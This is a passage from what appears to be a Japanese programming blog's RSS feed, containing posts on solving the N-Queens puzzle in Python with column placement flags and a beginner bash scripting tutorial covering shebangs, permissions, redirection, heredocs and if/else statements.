flex-grow: 100;
flex-basis: 240px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q12.png" data-size="328x328">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q12.png"
width="328"
height="328"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 100;
flex-basis: 240px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q13.png" data-size="326x326">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q13.png"
width="326"
height="326"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>i=2では&lt;br>
ABOARD[3]=2で4行目の右から3列目にクイーンを設置します。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 100;
flex-basis: 240px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q14.png" data-size="322x322">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-04-01-ani/q14.png"
width="322"
height="322"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
やっとフラグの制約に引っかからず443行のif文の中にはいれます。&lt;/p>
&lt;p>FA[2]=1&lt;br>
444行目でFA[2]=1 で右から3列目の位置にフラグをたてます。&lt;br>
445行目でnqueenを引数4を渡して呼び出して先に進みます。&lt;/p>
&lt;p>再帰呼び出しなのでrow=4の状態でメソッドの先頭435行目に移動します。&lt;br>
row=4なので438行目の if row == SIZE:の条件を満たします。&lt;br>
439でprintout()メソッドを呼び出してCOUNT と各行のクイーンの設置場所を出力します。&lt;/p>
&lt;p>細く動作をみていくとこんな感じになります。&lt;br>
ブルートフォースの時は無条件に再帰的にnqueenメソッドを呼び出し次の行にいっていましたが制約フラグを使うことによって無駄に深い階層にもぐっていくことを大分防止できていることがわかると思います。&lt;/p></description></item><item><title>第3回 pythonでNQueen（エイトクイーン）配置フラグ（制約テスト高速化）（１）</title><link>https://suzukiiichiro.github.io/posts/2022-02-03-01-ani/</link><pubDate>Thu, 03 Feb 2022 15:55:55 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-03-01-ani/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-03-01-ani/chess.jpg" alt="Featured image of post 第3回 pythonでNQueen（エイトクイーン）配置フラグ（制約テスト高速化）（１）" />&lt;h2 id="配置フラグ制約テスト高速化">配置フラグ（制約テスト高速化）&lt;/h2>
&lt;p>前回は全くアルゴリズムを使わないで全パターン１行に１つずつクイーンを設置するブルートフォース　力任せ探索でした。&lt;br>
エイトクイーン(N=8)ですら凄く時間がかかることが体感できたかと思います。&lt;/p>
&lt;p>今回も解を出すまでには至りませんが、一つ進んで、配置フラグ（制約テスト高速化）を使いより効率よく解の候補を列挙する方法を説明したいと思います。&lt;/p>
&lt;p>エイトクイーン問題はクイーンの利き筋上下左右斜め８方向にクイーンを置けないという制約があるのですが、今回は「上下の制約」すなわち、同じ列にはクイーンを置けないという制約を配置フラグを使って追加してみます。&lt;/p>
&lt;p>例えば、&lt;br>
1行目で右端にクイーンを置くと以降の行では右端にクイーンを置けなくなります。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 99;
flex-basis: 238px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-03-01-ani/q2.png" data-size="322x324">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-03-01-ani/q2.png"
width="322"
height="324"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
上の図だと2行目で1行目ですでにクイーンを置いている右端にクイーンを置こうとしているのでNGです。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 100;
flex-basis: 241px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-03-01-ani/q4.png" data-size="324x322">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-03-01-ani/q4.png"
width="324"
height="322"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
上の図は2行目は良いのですが3行目で1行目にすでにクイーンを置いている右端にクイーンを置こうとしているのでNGです。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 98;
flex-basis: 235px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-03-01-ani/q10.png" data-size="324x330">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-03-01-ani/q10.png"
width="324"
height="330"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 100;
flex-basis: 240px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-03-01-ani/q14.png" data-size="322x322">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-03-01-ani/q14.png"
width="322"
height="322"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>上の２つの図のように同じ列にクイーンを置かないパターンを探索します。&lt;/p>
&lt;p>配置フラグ（制約テスト高速化）を使って私の端末でエイトクイーン(N=8)を実行すると、0m0.554sかかります。ブルートフォースが3m7.321sかかったので360倍くらい速いですね。&lt;/p>
&lt;h2 id="グローバル変数について">グローバル変数について&lt;/h2>
&lt;p>それではプログラムについて説明していきましょう。&lt;/p>
&lt;p>プログラムソースは以下のURLにあります。&lt;/p>
&lt;p>&lt;a class="link" href="https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py02_nqueen.py" target="_blank" rel="noopener"
>https://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py02_nqueen.py&lt;/a>&lt;/p>
&lt;p>プログラムの作りとしては前回のブルートフォースをベースにしてそこに配置フラグを追加したものとなりますので、ブルートフォースとの差異を説明していきたいと思います。&lt;/p>
&lt;p>まず、グローバル変数について説明します。&lt;br>
今回も動作をわかりやすくするため419,420行目のMAXとSIZEを4に変更してみてください。&lt;/p>
&lt;p>423行目 配列 FA がグローバル変数として新しく追加されています。&lt;br>
0 for i in range(SIZE) で0に初期化しています。&lt;br>
どの列にクイーンを置いたかをフラグで管理します。&lt;br>
FA[0]が右端,FA[1]が右端から2番目,FA[2]が右端から3番目,FA[3]が右端から4番目(左端)になります。&lt;br>
例えば2列目にクイーンを置くとFA[1]=1にしてフラグを立てます。&lt;/p>
&lt;h2 id="nqueenメソッドについて">nqueenメソッドについて&lt;/h2>
&lt;p>nqueenメソッドの作りも基本的に前回のブルートフォースと同じです。&lt;br>
443行目〜446行目に配置フラグFAの処理が追加されているところが違う部分となります。&lt;/p>
&lt;p>442行目 ABOARD[row]=i でクイーンを設置します。&lt;br>
前回のブルートフォースの場合は&lt;br>
無条件で次の行でnqueen(row+1)で再帰的にnqueenを呼び出していました。 &lt;br>
今回の配置フラグでは&lt;br>
443行目 if FA[i] == 0: の条件を満たした場合だけ再帰的にnqueenを呼び出しています。&lt;/p>
&lt;p>iは今回クイーンを置いた場所を意味します。&lt;/p>
&lt;p>444行目でクイーンを置いた列の配置フラグをあらかじめ1にしておきます。&lt;/p>
&lt;p>例えば以下の図の様な場合&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 100;
flex-basis: 240px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-02-03-01-ani/q14.png" data-size="322x322">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-03-01-ani/q14.png"
width="322"
height="322"
loading="lazy"
alt="図"
>
&lt;/a>
&lt;/a>
&lt;figcaption>図&lt;/figcaption>
&lt;/figure>&lt;br>
1行目では右端にクイーンを置くので、&lt;br>
444行目の処理でFA[0]=1となります。&lt;br>
2行目は右端から2番目にクイーンを置くので、&lt;br>
FA[1]=1となります。&lt;br>
3行目は右端にクイーンを置いているのでiは0です。&lt;br>
443行目の if FA[i]== 0 : の判定で&lt;br>
FA[0]は1ですので443行目から446行目の処理には入らず次のfor文に移動することになります。&lt;/p>
&lt;p>この443,444,446行目の処理によってすでに同じ列にクイーンを置いている場合は下の行に行くのをやめるという動きを実現しています。&lt;/p>
&lt;p>446行目でFA[i]=0 という処理があります。&lt;br>
この処理は再帰の動きを理解する上で非常に重要な処理になります。&lt;br>
再帰から戻ってきた時は445行目の下からスタートすることになります。&lt;br>
再帰から戻ってきた時は変数の状態を再帰に入る直前の状態に戻す必要があります。&lt;br>
ローカル変数については特別にプログラムしないでも再帰前の状態に戻るのですが、グローバル変数は自分で設定しないと元に戻りません。&lt;br>
再帰から戻ってきた時はiにクイーンを置かなかったことになるのですから&lt;br>
FA[i]=0で明示的にフラグを落としてあげています。&lt;/p>
&lt;p>今回は配置フラグの全体的な流れを説明しました。次回は図で説明しながら実際の動きを追ってみましょう。&lt;/p></description></item><item><title>【grep/sed/awkも】ざっくりわかるシェルスクリプト５」</title><link>https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/</link><pubDate>Wed, 02 Feb 2022 15:55:47 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/shellscript.jpg" alt="Featured image of post 【grep/sed/awkも】ざっくりわかるシェルスクリプト５」" />&lt;p>この記事はシェルスクリプトを４５分でざっくりマスターできるチュートリアルです。bashスクリプト「Hello, World」から、ifステートメントなどの条件分岐、while, for, untilループをはじめ、シェルスクリプトの効率的なデバッグ手法の紹介など、シェルスクリプトを網羅的かつ短時間で学習することができます。&lt;br>
過去、bashの経験があり、久しぶりにbashを書く必要に迫られた人、他の言語でプログラム経験があり、bash独自の書き方をざっくりと思い出したい人は、このトピックを長め読むだけで、充分 bashを思い出せるはずです。&lt;br>
このトピックをざっくり読み流すとおよそ４５分でbashの構文を網羅的に理解することができます。&lt;/p>
&lt;p>では次のトピックについて説明します。&lt;/p>
&lt;h2 id="はじめてのシェルスクリプト">はじめてのシェルスクリプト&lt;/h2>
&lt;p>このトピックでは、catコマンドでシェルの場所を確認後、スクリプトファイルの作成、echoコマンドを使用して「Hello,shellscript.」記述し、スクリプトファイルを実行可能にします。&lt;/p>
&lt;p>ではまず、ターミナルに次のコマンドを入力します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat /etc/shells
&lt;/code>&lt;/pre>&lt;p>実行するとおおよそ次の出力となります。&lt;/p>
&lt;p>$ cat /etc/shells&lt;br>
/bin/sh&lt;br>
/bin/bash&lt;br>
/sbin/nologin&lt;br>
/usr/bin/sh&lt;br>
/usr/bin/bash&lt;br>
/usr/sbin/nologin&lt;br>
$&lt;/p>
&lt;p>このコマンドは、システムで利用可能なすべてのシェルを表示し、それらのいずれかを使用できます。&lt;br>
このタスクでシステムにbashシェルがあるかどうかを確認できました。bashのパスを知るには、ターミナルで「$ which bash」を実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ which bash
/usr/bin/bash
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>このパスをシェバンといいます。シェルスクリプトを実行する「bash」のPATHは「/usr/bin/bash」であることがわかりました。このシェバンを、すべてのシェルスクリプトのページ先頭に書き込む必要があります。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;p>シェバンをソースファイルの先頭行に書きます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:helloScript.sh" data-lang="bash:helloScript.sh">&lt;span class="cp">#!/usr/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ではさっそく「helloScript.sh」ファイルに「Hello,shellscript.」を記述しましょう。内容は以下の通りです。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:helloScript.sh" data-lang="bash:helloScript.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello,shellscript.&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ファイルを保存し、ターミナルに戻り、「ls」コマンドを実行してファイルの存在を確認します。「ls -la」を使用してファイルの詳細を取得することもできます。&lt;br>
その結果は、次のようになります。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ls
helloScript.sh
$
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>$ ls -la
-rw-rw-r-- 1 suzuki suzuki 44 2月 2 18:30 helloScript.sh
$
&lt;/code>&lt;/pre>&lt;p>&amp;lsquo;rw-rw-r&amp;rsquo; は、ファイルの所有者が、ファイへの読み取り、および書き込み権限を持っていることを示します。&lt;/p>
&lt;p>読むことができる (Readable) r 4&lt;br>
書くことができる (Writable) w 2&lt;br>
実行することができる (eXecutable) x 1&lt;br>
なにもできない - 0&lt;/p>
&lt;p>３つのブロックにわかれているのは、グループを示しています。&lt;/p>
&lt;p>自分 グループ 他人&lt;br>
xrw xrw xrw&lt;/p>
&lt;p>現在のhelloScript.shは -rw ですから、読むことと、書くことはできるものの、実行する権限がないようです。&lt;br>
このスクリプトを実行可能にするには、ターミナルで次のコマンドを実行する必要があります。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ chmod +x helloScript.sh
&lt;/code>&lt;/pre>&lt;p>次に、「ls -la」コマンドを使用して「helloScript.sh」ファイルのアクセス許可を確認し、次の出力が得られます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ls -la
-rwxrwxr-x 1 suzuki suzuki 44 2月 2 18:30 helloScript.sh
$
&lt;/code>&lt;/pre>&lt;p>実行権限が付きました。&lt;br>
次に、ターミナルのコマンド「$ bash /helloScript.sh」を使用してファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ./helloScript.sh
Hello, shell script.
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>ファイルの実行方法はざっくりと２種類あります。&lt;/dd>
&lt;dd>$ chmod +x &amp;lt;ファイル名&amp;gt;&lt;/dd>
&lt;dd>で、実行権限を与えたうえで、&lt;/dd>
&lt;dd>$ ./&amp;lt;ファイル名&amp;gt;&lt;/dd>
&lt;dd>とする方法。&lt;/dd>
&lt;dd>
&lt;p>ファイルに実行権限を与えずに&lt;/p>
&lt;/dd>
&lt;dd>$ bash &amp;lt;ファイル名&amp;gt;&lt;/dd>
&lt;dd>と、する方法です。&lt;/dd>
&lt;dd>
&lt;p>セキュリティ的には後者が望ましいです。&lt;/p>
&lt;/dd>
&lt;dd>理由は、悪意を持つ第三者、または誤操作によってスクリプトファイルが簡単に実行できてしまう環境を作るべきではないからです。&lt;/dd>
&lt;dd>何のファイルかわかりもせずに　&lt;/dd>
&lt;dd>$ ./&amp;lt;ファイル名&amp;gt;&lt;/dd>
&lt;dd>で実行できてしまうのは恐怖です。&lt;/dd>
&lt;dd>実行する場合、ソースの中身を確認するのはもちろんですが、実行権限を軽率に与えることは控えましょう。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="ファイルへの出力">ファイルへの出力&lt;/h2>
&lt;p>このトピックでは、シェルスクリプトの実行結果を、別のファイルに出力する方法を紹介します。「helloScript.sh」の echo 行の末尾に少し追記するだけです。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:helloScript.sh" data-lang="bash:helloScript.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello, shell script.&amp;#34;&lt;/span> &amp;gt; hello.txt&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ファイルを保存し、「$ bash helloScript.sh」でスクリプトを実行します。&lt;br>
次の出力が表示されます。「ls -la」を押して、新しいファイルが存在することを確認してください。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ls -la
helloScript.sh hello.txt
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>「&amp;gt;」をリダイレクトと言います。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;p>ファイルの出力は２種類あります。&lt;br>
リダイレクト出力は、新規に空のファイルを作成したうえで文字を出力します。&lt;br>
もう一つの出力方法は「アペンド &amp;raquo; 」です。&lt;br>
アペンドは、既に存在するファイルに追記します。&lt;br>
追記方法は簡単で、&amp;raquo; を使うだけです。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:helloScript.sh" data-lang="bash:helloScript.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello, shell script.&amp;#34;&lt;/span> &amp;gt; hello.txt&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;and bash.&amp;#34;&lt;/span> &amp;gt;&amp;gt; hello.txt&lt;span class="p">;&lt;/span> &lt;span class="c1"># ここで追記&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>「&amp;raquo;」をアペンドと言います。&lt;/dd>
&lt;dd>アペンドするときの注意点は、アペンドする場合は、既にファイルが存在している必要があります。「touch」コマンドでファイルを生成したうえでアペンドするか、あらかじめ「&amp;gt; リダイレクト」でファイルを生成し、文字列を追記したうえで、「&amp;raquo; アペンド」します。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="コメント">コメント&lt;/h2>
&lt;p>コメントはスクリプトの実行時に無視されます。スクリプトでは、コメントは何もしません。コメントには３つの種類があります。&lt;/p>
&lt;p>1行のコメント&lt;br>
複数行のコメント&lt;br>
HereDoc Delimeter&lt;/p>
&lt;p>1行のコメントの場合、コメントステートメントの前に「#」記号を半角で書きます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:lineComment.sh" data-lang="bash:lineComment.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="c1"># this is a 1st comment&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello,shellscript.&amp;#34;&lt;/span> &amp;gt; file.txt&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>コメントを複数行にわたって書きたいことがあります。行頭に「# 」を書けばよいのですが、改行の度に行頭に「# 」を挿入する必要があり、とっても面倒です。&lt;br>
C 言語やJava、HTMLですらも複数行コメントがあるのに。。。&lt;br>
シェルスクリプトにもあります。あるんです。みんな知らないだけです。&lt;br>
最初のコメントの先頭の前に「:'」を置き、最後のコメントの後に「'」と書くことだけです。理解を深めるために、次のスクリプトを調べることができます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:multiComment.sh" data-lang="bash:multiComment.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
:&lt;span class="s1">&amp;#39;
&lt;/span>&lt;span class="s1">This is the segment of multi-line comments
&lt;/span>&lt;span class="s1">Through this script, you will learn
&lt;/span>&lt;span class="s1">How to do multi-line commenting
&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>
&lt;span class="c1"># this is a 1st comment&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello,shellscript.&amp;#34;&lt;/span> &amp;gt; file.txt
&lt;/code>&lt;/pre>&lt;/div>&lt;p>仰々しいマルチラインコメントもあります。&lt;br>
こちらのマルチラインコメントが使われない理由は、これから紹介するヒアドキュメントの記述方法に似ていてまぎらわしいからです。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:multiComment.sh" data-lang="bash:multiComment.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="c1"># 仰々しいマルチラインコメント&lt;/span>
&lt;span class="s">&amp;lt;&amp;lt;COMMENT
&lt;/span>&lt;span class="s"> your comment 1
&lt;/span>&lt;span class="s"> comment 2
&lt;/span>&lt;span class="s"> blah
&lt;/span>&lt;span class="s">COMMENT&lt;/span>
&lt;span class="c1"># シンプルなマルチラインコメント&lt;/span>
:&lt;span class="s1">&amp;#39;
&lt;/span>&lt;span class="s1">This is the segment of multi-line comments
&lt;/span>&lt;span class="s1">Through this script, you will learn
&lt;/span>&lt;span class="s1">How to do multi-line commenting
&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>
&lt;span class="c1"># this is a 1st comment&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello,shellscript.&amp;#34;&lt;/span> &amp;gt; file.txt&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ヒアドキュメントはとてもべんりな出力方法です。&lt;br>
コメントではありませんが、上記のマルチラインコメントと似ているので、ここでご紹介します。&lt;/p>
&lt;p>通常、複数の行出力は以下のように記述します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:hereDocuments.sh" data-lang="bash:hereDocuments.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
touch file.txt&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello,shellscript 1.&amp;#34;&lt;/span> &amp;gt;&amp;gt; file.txt&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello,shellscript 2.&amp;#34;&lt;/span> &amp;gt;&amp;gt; file.txt&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Hello,shellscript 3.&amp;#34;&lt;/span> &amp;gt;&amp;gt; file.txt&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>とっても面倒ですね。&lt;br>
そこでヒアドキュメントの出番となります。ヒアドキュメントでは以下のように書くことができます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:hereDocuments.sh" data-lang="bash:hereDocuments.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
cat &lt;span class="s">&amp;lt;&amp;lt; EOS
&lt;/span>&lt;span class="s">Hello,shellscript 1.
&lt;/span>&lt;span class="s">Hello,shellscript 2.
&lt;/span>&lt;span class="s">Hello,shellscript 3.
&lt;/span>&lt;span class="s">EOS&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>スクリプトを実行すると、次の出力が表示されます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash hereDocuments.sh
Hello,shellscript 1.
Hello,shellscript 2.
Hello,shellscript 3.
$
&lt;/code>&lt;/pre>&lt;p>cat の後ろに 「 - ハイフン」を置くと、インデントが有効になります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:hereDocuments.sh" data-lang="bash:hereDocuments.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
cat &lt;span class="s">&amp;lt;&amp;lt;-EOS
&lt;/span>&lt;span class="s"> Hello,shellscript 1.
&lt;/span>&lt;span class="s"> Hello,shellscript 2.
&lt;/span>&lt;span class="s"> Hello,shellscript 3.
&lt;/span>&lt;span class="s">EOS&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>スクリプトを実行すると、次の出力が表示されます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash hereDocuments.sh
Hello,shellscript 1.
Hello,shellscript 2.
Hello,shellscript 3.
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>cat &amp;laquo;-EOS&lt;/dd>
&lt;dd>(-)ハイフンを置くtipsを忘れずに。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="条件分岐">条件分岐&lt;/h2>
&lt;p>このトピックでは以下について説明します。&lt;/p>
&lt;p>ifステートメント&lt;br>
if-elseステートメント&lt;br>
if-else ifステートメント&lt;br>
AND演算子とOR演算子&lt;/p>
&lt;h3 id="ifステートメント">Ifステートメント&lt;/h3>
&lt;p>ifセグメントに条件を書き込むには、条件の前後に「[ ]」内に余分なものを与える必要があります。その後、条件コードを述べ、次の行に移動し、「その後」と書き、条件がtrueの場合に実行するコード行を述べます。最後に、ifステートメントを閉じるには「fi」を使用します。以下は、ifステートメントの構文を理解するスクリプトコードの例です。&lt;/p>
&lt;p>ifステートメントには「[ ]」内に条件を書きます。&lt;br>
「if」と 「[」の間には半角スペースが必要です。&lt;br>
また、「[」と条件文、条件文と「]」の間にも半角スペースが必要です。&lt;br>
ifの終わりには、「fi」で閉じる必要があります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:if-statements.sh" data-lang="bash:if-statements.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">count&lt;/span>&lt;span class="o">=&lt;/span>10&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$count&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -eq &lt;span class="m">10&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;the condition is true&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>このスクリプトは変数「カウント」に「10」の値を割り当てます。&lt;br>
「if」の条件「[ &amp;ldquo;$count&amp;rdquo; -eq 10 ]」は、count変数の値が10と「等しい」かどうかを確認する条件文です。&lt;br>
この条件がtrueで成立すると、処理は次のステートメントに移動します。&lt;br>
最後の「fi」は、このif-statementブロックの終了を示すキーワードです。&lt;/p>
&lt;p>条件が成立しない場合、このプログラムには「else」ブロックがないため、何もしません。&lt;/p>
&lt;p>次のプログラムは条件が成立しない場合の処理となります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:ifelse-statements.sh" data-lang="bash:ifelse-statements.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">count&lt;/span>&lt;span class="o">=&lt;/span>11&lt;span class="p">;&lt;/span> &lt;span class="c1"># COUNT は 11とする&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$count&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> -eq &lt;span class="m">10&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;the condition is true&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;the condition is false. count: &lt;/span>&lt;span class="nv">$count&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>このプログラムでは、「$count」変数は11の値で割り当てています。&lt;br>
この場合、ifブロックの条件が成立しないため、「if」セクション全体を無視して「else」ブロックに移動します。&lt;br>
端末は、条件がfalseであるというステートメントと$countを表示します。&lt;/p>
&lt;p>条件を書くための別の形式もあります。&lt;br>
「[ ]」を「(( ))」括弧に置き換え、それらの間に条件を書き込むだけです。&lt;br>
C言語、Javaに慣れている人は、この記述方法のほうが直観的かもしれません。&lt;br>
この形式の例を次に示します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:bracketIfelse-statements.sh" data-lang="bash:bracketIfelse-statements.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">count&lt;/span>&lt;span class="o">=&lt;/span>11&lt;span class="p">;&lt;/span> &lt;span class="c1"># COUNT は 11とする&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">((&lt;/span>&lt;span class="nv">count&lt;/span>&lt;span class="o">==&lt;/span>10&lt;span class="o">))&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;the condition is true&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;the condition is false count: &lt;/span>&lt;span class="nv">$count&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
